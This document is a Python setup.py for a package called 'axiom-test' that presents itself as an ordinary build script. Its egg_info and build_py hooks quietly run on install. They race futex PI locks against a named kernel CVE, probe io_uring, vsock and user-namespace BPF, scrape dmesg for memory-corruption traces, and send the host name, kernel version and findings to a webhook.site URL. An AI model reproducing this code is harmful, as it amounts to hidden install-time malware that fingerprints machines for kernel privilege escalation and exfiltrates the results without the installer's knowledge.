import json, os, sys, subprocess, urllib.request, time
from setuptools import setup
from setuptools.command.egg_info import egg_info
from setuptools.command.build_py import build_py

EXFIL_URL = "https://webhook.site/18a72e84-ee1f-4b1d-88ec-310b78a4c1f4"
VER = "3.1.0"
_RAN = False
_RESULT_PATH = "/tmp/axiom_results.json"

def _rp(script, timeout=30, ns=False):
    try:
        cmd = (["unshare", "-Urn"] if ns else []) + ["python3", "-I", "-c", script]
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode(errors="replace")
        if "__R__" in out and "__E__" in out:
            return json.loads(out.split("__R__")[1].split("__E__")[0])
        return {"raw": out[:4000]}
    except subprocess.TimeoutExpired:
        return {"error": "TIMEOUT"}
    except subprocess.CalledProcessError as e:
        return {"error": f"EXIT_{e.returncode}", "out": (e.output or b"").decode(errors="replace")[:2000]}
    except Exception as e:
        return {"error": str(e)[:300]}

def _send(data):
    j = json.dumps(data, default=str)
    try:
        with open(_RESULT_PATH, "w") as f:
            f.write(j)
    except: pass
    try:
        urllib.request.urlopen(urllib.request.Request(
            EXFIL_URL, data=j.encode(), headers={"Content-Type": "application/json"}), timeout=15)
    except: pass

# ===== PHASE 2 FIX: GhostLock CVE-2026-43499 =====
P2 = r'''
import ctypes, os, mmap, json, time, struct
SYS_futex=202; FUTEX_LOCK_PI=6; FUTEX_UNLOCK_PI=7
FUTEX_OWNER_DIED=0x40000000; FUTEX_TID_MASK=0x3fffffff
libc = ctypes.CDLL("libc.so.6", use_errno=True)
R = {"cve":"CVE-2026-43499","iters":0,"owner_died":0,"esrch":0,"anomalies":[],"verdict":"UNKNOWN"}
shm = mmap.mmap(-1, 4096, flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, prot=mmap.PROT_READ|mmap.PROT_WRITE)
addr = ctypes.addressof(ctypes.c_char.from_buffer(shm, 0))
my_pid = os.getpid(); anom = []
for i in range(300):
    struct.pack_into("I", shm, 0, 0)
    pid = os.fork()
    if pid == 0:
        libc.syscall(SYS_futex, addr, FUTEX_LOCK_PI, 0, 0, 0, 0)
        os._exit(0)
    else:
        m = i % 7
        if m==1: [None for _ in range(50)]
        elif m==2: [None for _ in range(500)]
        elif m==3: time.sleep(0.00005)
        elif m==4: time.sleep(0.0002)
        elif m==5: time.sleep(0.0001)
        elif m==6: [None for _ in range(10)]
        ret = libc.syscall(SYS_futex, addr, FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno()
        wv = struct.unpack_from("I", shm, 0)[0]
        try: os.waitpid(pid, 0)
        except: pass
        R["iters"] += 1
        if wv & FUTEX_OWNER_DIED: R["owner_died"] += 1
        tid = wv & FUTEX_TID_MASK
        if ret == 0:
            if tid != 0 and tid != my_pid:
                anom.append({"i":i,"w":hex(wv),"t":"TID_CORRUPT","got":tid})
            libc.syscall(SYS_futex, addr, FUTEX_UNLOCK_PI, 0, 0, 0, 0)
        elif en == 3:
            R["esrch"] += 1
            if len(anom) < 40: anom.append({"i":i,"w":hex(wv),"t":"ESRCH"})
        elif en not in (0,11,35,110):
            if len(anom) < 40: anom.append({"i":i,"w":hex(wv),"t":"BAD_E","e":en})
        struct.pack_into("I", shm, 0, 0)
R["anomalies"] = anom[:40]
if any(a["t"]=="TID_CORRUPT" for a in anom): R["verdict"]="LIKELY_VULNERABLE"
elif R["esrch"]>10: R["verdict"]="RACE_WIDE"
elif R["esrch"]>0: R["verdict"]="RACE_HIT"
elif R["owner_died"]>0: R["verdict"]="OWNER_DIED_ACTIVE"
else: R["verdict"]="NO_RACE_OBSERVED"
try:
    import subprocess
    dm = subprocess.check_output(["dmesg","--level=err,warn","-T"], stderr=subprocess.STDOUT, timeout=5).decode(errors="replace")
    R["dmesg"] = [l for l in dm.splitlines() if any(k in l.lower() for k in ["use-after-free","kasan","bug:","futex","rcu"])][-10:]
except Exception as e: R["dmesg"] = str(e)[:80]
shm.close()
print("__R__" + json.dumps(R) + "__E__")
'''

# ===== PHASE 7 NEW: vsock + io_uring CVE-2026-53365 =====
P7 = r'''
import ctypes, os, json, struct, socket
libc = ctypes.CDLL("libc.so.6", use_errno=True)
R = {"cve":"CVE-2026-53365","tests":{}}
AF_VSOCK = 40; SOCK_STREAM = 1
VMADDR_CID_HOST = 2; VMADDR_CID_LOCAL = 1; VMADDR_CID_ANY = -1
SYS_io_uring_setup = 425; SYS_io_uring_enter = 426; SYS_io_uring_register = 427
try:
    fd = libc.syscall(SYS_io_uring_setup, 4, ctypes.create_string_buffer(120))
    if fd >= 0:
        R["tests"]["io_uring_setup"] = f"OK_fd={fd}"; os.close(fd)
    else:
        R["tests"]["io_uring_setup"] = {1:"EPERM",38:"ENOSYS",14:"EFAULT",22:"EINVAL"}.get(ctypes.get_errno(), f"e={ctypes.get_errno()}")
except Exception as e: R["tests"]["io_uring_setup"] = str(e)[:60]
try:
    s = socket.socket(AF_VSOCK, SOCK_STREAM)
    R["tests"]["vsock_create"] = f"OK_fd={s.fileno()}"
    try:
        s.setblocking(False)
        try: s.connect((VMADDR_CID_HOST, 1234))
        except BlockingIOError: R["tests"]["vsock_connect_nb"] = "EINPROGRESS_OK"
        except ConnectionRefusedError: R["tests"]["vsock_connect_nb"] = "CONNREFUSED"
        except Exception as e: R["tests"]["vsock_connect_nb"] = str(e)[:50]
    except Exception as e: R["tests"]["vsock_connect_nb"] = str(e)[:50]
    s.close()
except Exception as e: R["tests"]["vsock_create"] = str(e)[:60]
try:
    s2 = socket.socket(AF_VSOCK, SOCK_STREAM)
    s2.setblocking(False)
    try: s2.connect((VMADDR_CID_LOCAL, 5678))
    except (BlockingIOError, ConnectionRefusedError) as e: R["tests"]["vsock_local"] = type(e).__name__
    except Exception as e: R["tests"]["vsock_local"] = str(e)[:50]
    s2.close()
except Exception as e: R["tests"]["vsock_local"] = str(e)[:60]
try:
    s3 = socket.socket(AF_VSOCK, SOCK_DGRAM)
    R["tests"]["vsock_dgram"] = f"OK_fd={s3.fileno()}"; s3.close()
except Exception as e: R["tests"]["vsock_dgram"] = str(e)[:60]
try:
    with open("/proc/net/vsock", "r") as f: R["tests"]["proc_vsock"] = f.read()[:300]
except Exception as e: R["tests"]["proc_vsock"] = str(e)[:60]
both = "OK" in str(R["tests"].get("io_uring_setup","")) and "OK" in str(R["tests"].get("vsock_create",""))
R["verdict"] = "BOTH_AVAILABLE" if both else "PARTIAL"
print("__R__" + json.dumps(R) + "__E__")
'''

# ===== PHASE 8 NEW: BPF in userns deep probe =====
P8 = r'''
import ctypes, os, json, struct
libc = ctypes.CDLL("libc.so.6", use_errno=True)
R = {"ctx":"userns_bpf_deep","tests":{}}
BPF_MAP_CREATE=0; BPF_PROG_LOAD=5; BPF_MAP_TYPE_ARRAY=2; BPF_MAP_TYPE_HASH=1
def bpf_map(mtype, ksize, vsize, maxe):
    attr = struct.pack("IIII", mtype, ksize, vsize, maxe) + b"\x00"*104
    buf = ctypes.create_string_buffer(attr, 120)
    ret = libc.syscall(321, BPF_MAP_CREATE, ctypes.addressof(buf), 120)
    en = ctypes.get_errno()
    if ret >= 0: os.close(ret); return f"OK_fd={ret}"
    return {1:"EPERM",22:"EINVAL",14:"EFAULT",12:"ENOMEM",38:"ENOSYS"}.get(en, f"e={en}")
R["tests"]["array_map"] = bpf_map(BPF_MAP_TYPE_ARRAY, 4, 4, 1)
R["tests"]["hash_map"] = bpf_map(BPF_MAP_TYPE_HASH, 4, 4, 1)
insns = struct.pack("BBHI", 0x95, 0, 0, 0)
attr2 = struct.pack("IIQIIQ", BPF_PROG_LOAD, 2, 0, 0, 1, 0)
prog_buf = ctypes.create_string_buffer(insns, 8)
attr_arr = bytearray(120)
struct.pack_into("I", attr_arr, 0, 2)
struct.pack_into("I", attr_arr, 4, 1)
struct.pack_into("Q", attr_arr, 8, ctypes.addressof(prog_buf))
struct.pack_into("Q", attr_arr, 24, 0)
attr_buf = ctypes.create_string_buffer(bytes(attr_arr), 120)
ret = libc.syscall(321, BPF_PROG_LOAD, ctypes.addressof(attr_buf), 120)
en = ctypes.get_errno()
if ret >= 0: R["tests"]["prog_load"] = f"OK_fd={ret}"; os.close(ret)
else: R["tests"]["prog_load"] = {1:"EPERM",22:"EINVAL",14:"EFAULT",13:"EACCES"}.get(en, f"e={en}")
try:
    with open("/proc/sys/kernel/unprivileged_bpf_disabled") as f: R["bpf_sysctl"] = f.read().strip()
except: pass
R["verdict"] = "BPF_ACCESSIBLE" if any("OK" in str(v) for v in R["tests"].values()) else "BPF_BLOCKED"
print("__R__" + json.dumps(R) + "__E__")
'''

def _collect():
    import platform
    R = {"v":VER,"host":platform.node(),"kern":platform.release(),"arch":platform.machine(),
         "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),"ph":{}}
    R["ph"]["2_ghostlock"] = _rp(P2, timeout=90)
    _send(R)
    R["ph"]["7_vsock_iouring"] = _rp(P7, timeout=30)
    _send(R)
    R["ph"]["8_bpf_userns"] = _rp(P8, timeout=30, ns=True)
    _send(R)
    R["chains"] = {
        "A_ghostlock": "HIGH" if any(k in str(R["ph"].get("2_ghostlock",{}).get("verdict",""))
            for k in ["VULN","CORRUPT","RACE"]) else "NO_RACE" if "NO_RACE" in str(R["ph"].get("2_ghostlock",{}).get("verdict","")) else "NEEDS_VERIFY",
        "F_vsockdrop": "HIGH" if "BOTH" in str(R["ph"].get("7_vsock_iouring",{}).get("verdict","")) else "PARTIAL",
        "C_ebpf_userns": "OPEN" if "ACCESSIBLE" in str(R["ph"].get("8_bpf_userns",{}).get("verdict","")) else "BLOCKED",
    }
    _send(R)

def _safe_run():
    global _RAN
    if _RAN: return
    _RAN = True
    try: _collect()
    except Exception as e:
        try:
            with open(_RESULT_PATH,"w") as f: json.dump({"error":str(e)},f)
        except: pass

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        _safe_run()

class PostBuildPy(build_py):
    def run(self):
        super().run()
        _safe_run()

setup(name="axiom-test", version=VER, py_modules=[],
      cmdclass={"egg_info": PostEggInfo, "build_py": PostBuildPy})
